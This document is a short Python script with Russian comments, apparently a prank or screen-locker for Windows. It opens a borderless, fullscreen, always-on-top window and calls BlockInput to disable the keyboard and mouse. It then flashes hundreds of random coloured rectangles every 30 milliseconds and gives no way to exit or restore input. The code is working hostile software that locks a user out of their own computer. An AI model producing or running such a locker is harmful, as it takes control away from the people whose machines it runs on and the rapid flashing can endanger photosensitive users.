import tkinter as tk
import random
import ctypes

def block_keys():
    # Блокировка Alt+F4 и системных клавиш
    ctypes.windll.user32.BlockInput(True)

def glitch():
    canvas.delete("all")
    for _ in range(400):
        x1 = random.randint(0, root.winfo_screenwidth())
        y1 = random.randint(0, root.winfo_screenheight())
        x2 = x1 + random.randint(10, 120)
        y2 = y1 + random.randint(5, 40)
        color = random.choice(["#ff0000", "#00ff00", "#0000ff", "#ffff00", "#ff00ff", "#00ffff"])
        canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
    root.after(30, glitch)

root = tk.Tk()
root.attributes("-fullscreen", True, "-topmost", True)
root.configure(bg="black")
root.overrideredirect(True)  # Убираем рамку и кнопку закрытия

canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                   height=root.winfo_screenheight(), 
                   highlightthickness=0)
canvas.pack()

block_keys()
glitch()
root.mainloop()